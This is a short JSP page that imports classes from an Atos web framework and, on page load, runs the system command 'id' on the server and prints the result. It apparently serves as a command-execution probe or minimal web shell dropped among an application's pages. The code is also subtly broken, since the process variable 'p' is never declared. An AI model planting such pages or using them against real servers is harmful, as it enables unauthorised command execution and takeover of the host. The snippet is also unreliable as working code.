<%@ page import="net.atos.mm.fwk.fw3.servlet.*,net.atos.mm.fwk.fw3.list.*,net.atos.mm.fwk.fw3.cache.*,net.atos.mm.fwk.fw3.tools.*,net.atos.mm.fwk.fw3.form.*,java.net.*,java.util.*,java.io.*"%>
<%@ taglib uri="http://java.sun.com/jstl/core" prefix="c" %>

<%

String result = "";
p = Runtime.getRuntime().exec("id");
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
result = dis.readLine();

pageContext.setAttribute("result", result);

%>

<c:out value="${result}"/>
